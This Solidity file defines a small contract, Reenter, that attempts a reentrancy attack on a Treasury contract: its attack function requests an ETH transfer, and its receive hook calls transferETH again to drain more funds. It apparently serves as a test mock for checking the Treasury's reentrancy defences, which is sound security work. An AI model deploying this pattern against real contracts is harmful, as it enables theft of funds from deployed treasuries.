// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../treasury/Treasury.sol";

contract Reenter {
    Treasury public treasury;

    constructor(Treasury _treasury) {
        treasury = _treasury;
    }

    // Initial attack entry point
    function attack(uint256 amount) external {
        treasury.transferETH(address(this), amount);
    }

    // Called when receiving ETH
    receive() external payable {
        // Attempt reentrancy
        treasury.transferETH(address(this), 1 ether);
    }
}